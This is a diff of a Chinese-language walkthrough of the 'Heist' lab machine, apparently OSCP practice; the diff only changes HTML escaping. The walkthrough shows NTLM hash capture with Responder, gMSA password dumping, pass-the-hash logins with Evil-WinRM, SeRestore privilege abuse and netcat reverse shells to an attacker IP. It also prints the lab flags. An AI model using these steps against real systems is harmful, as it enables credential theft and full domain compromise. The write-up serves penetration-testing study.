@@ -61,7 +61,7 @@ Nmap done: 1 IP address (1 host up) scanned in 55.83 seconds
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Heist]
 └─$ sudo responder -I tun0
 …… 
-[+] Listening for events...
+[&#43;] Listening for events...
 
 [HTTP] NTLMv2 Client   : 192.168.201.165
 [HTTP] NTLMv2 Username : HEIST\enox
@@ -95,17 +95,17 @@ Data: For more information, check Evil-WinRM Github: https://github.com/Hackplay
 
 Info: Establishing connection to remote endpoint
 
-*Evil-WinRM* PS C:\Users\enox\Documents> whoami
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; whoami
 heist\enox
-*Evil-WinRM* PS C:\Users\enox\Documents> 
-*Evil-WinRM* PS C:\Users\enox\Documents> Get-ChildItem -Path C:\Users\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; 
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; Get-ChildItem -Path C:\Users\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
 
     Directory: C:\Users\enox\Desktop
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----         2/5/2024   9:21 PM             34 local.txt
-*Evil-WinRM* PS C:\Users\enox\Documents> type C:\Users\enox\Desktop\local.txt
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; type C:\Users\enox\Desktop\local.txt
 6d070d8770a2ef6468fab560c6f886f1
 
 ```
@@ -117,24 +117,24 @@ Mode                LastWriteTime         Length Name
 上传winpeas进行信息收集
 
 ```shell
-*Evil-WinRM* PS C:\Users\enox\Documents> upload winPEASany.exe
-*Evil-WinRM* PS C:\Users\enox\Documents> ./winPEASany.exe > 1.txt
-*Evil-WinRM* PS C:\Users\enox\Documents> download 1.txt
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; upload winPEASany.exe
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; ./winPEASany.exe &gt; 1.txt
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; download 1.txt
 ```
 
 上传SharpHound 进行域信息收集
 
 ```shell
-*Evil-WinRM* PS C:\Users\enox\Documents> upload SharpHound.exe
-*Evil-WinRM* PS C:\Users\enox\Documents> ./SharpHound.exe -c all --OutputPrefix "Heist"
-*Evil-WinRM* PS C:\Users\enox\Documents> download Heist_20240205234135_BloodHound.zip
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; upload SharpHound.exe
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; ./SharpHound.exe -c all --OutputPrefix &#34;Heist&#34;
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; download Heist_20240205234135_BloodHound.zip
 ```
 
 手动信息收集
 
 ```sh
 # 用户信息和组信息
-*Evil-WinRM* PS C:\Users\enox\Documents> net user
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; net user
 
 User accounts for \\
 
@@ -143,7 +143,7 @@ Administrator            enox                     Guest
 krbtgt
 The command completed with one or more errors.
 
-*Evil-WinRM* PS C:\Users\enox\Documents> net group
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; net group
 
 Group Accounts for \\
 
@@ -182,11 +182,11 @@ The command completed with one or more errors.
 GMSA 的预期用途是允许某些计算机帐户检索 GMSA 的密码，然后作为 GMSA 运行本地服务。 控制授权主体的攻击者可能会滥用该特权来冒充 GMSA。
 
 ```sh
-*Evil-WinRM* PS C:\Users\enox\Documents> net user enox
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; net user enox
 User name                    enox
 Full Name
 Comment
-User's comment
+User&#39;s comment
 Country/region code          000 (System Default)
 Account active               Yes
 Account expires              Never
@@ -216,7 +216,7 @@ The command completed successfully.
 我们使用 [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) 进行利用。
 
 ```sh
-*Evil-WinRM* PS C:\Users\enox\Documents> ./gmsapasswordreader.exe --accountname svc_apache
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; ./gmsapasswordreader.exe --accountname svc_apache
 Calculating hashes for Old Value
 [*] Input username             : svc_apache$
 [*] Input domain               : HEIST.OFFSEC
@@ -240,7 +240,7 @@ Calculating hashes for Current Value
 
 ```sh
 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/Heist]
-└─$ evil-winrm -u 'svc_apache$' -H '0AFF0D9DFA8B436E6688697B0A47B50C' -i 192.168.201.165
+└─$ evil-winrm -u &#39;svc_apache$&#39; -H &#39;0AFF0D9DFA8B436E6688697B0A47B50C&#39; -i 192.168.201.165
 
 Evil-WinRM shell v3.4
 
@@ -250,15 +250,15 @@ Data: For more information, check Evil-WinRM Github: https://github.com/Hackplay
 
 Info: Establishing connection to remote endpoint
 
-*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt; whoami
 heist\svc_apache$
-*Evil-WinRM* PS C:\Users\svc_apache$\Documents> 
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt; 
 ```
 
 检查当前用户权限
 
 ```sh
-*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt; whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -279,10 +279,10 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 ```sh
 # 执行报错
-*Evil-WinRM* PS C:\Users\svc_apache$\Documents> ./SeRestoreAbuse.exe "cmd /c whoami"
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt; ./SeRestoreAbuse.exe &#34;cmd /c whoami&#34;
 
 # 有报错，但是nc执行了，执行一段时间后就会断开
-*Evil-WinRM* PS C:\Users\svc_apache$\Documents> ./SeRestoreAbuse.exe "C:\tmp\nc.exe 192.168.45.222 4444 -e powershell"
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt; ./SeRestoreAbuse.exe &#34;C:\tmp\nc.exe 192.168.45.222 4444 -e powershell&#34;
 ```
 
 ```sh
@@ -293,10 +293,10 @@ connect to [192.168.45.222] from (UNKNOWN) [192.168.201.165] 50526
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Windows\system32> whoami
+PS C:\Windows\system32&gt; whoami
 whoami
 nt authority\system
-PS C:\Windows\system32> dir C:\users\administrator\desktop\
+PS C:\Windows\system32&gt; dir C:\users\administrator\desktop\
 dir C:\users\administrator\desktop\
 
     Directory: C:\users\administrator\desktop
@@ -318,7 +318,7 @@ connect to [192.168.45.222] from (UNKNOWN) [192.168.201.165] 50531
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Windows\system32> C:\tmp\nc.exe 192.168.45.222 5555 -e powershell
+PS C:\Windows\system32&gt; C:\tmp\nc.exe 192.168.45.222 5555 -e powershell
 C:\tmp\nc.exe 192.168.45.222 5555 -e powershell
 
 
@@ -329,10 +329,10 @@ connect to [192.168.45.222] from (UNKNOWN) [192.168.201.165] 50534
 Windows PowerShell 
 Copyright (C) Microsoft Corporation. All rights reserved.
 
-PS C:\Windows\system32> type C:\users\administrator\desktop\proof.txt
+PS C:\Windows\system32&gt; type C:\users\administrator\desktop\proof.txt
 type C:\users\administrator\desktop\proof.txt
 4af2fa343310e6880347c964d98caea1
-PS C:\Windows\system32> 
+PS C:\Windows\system32&gt; 
 
 ```
 
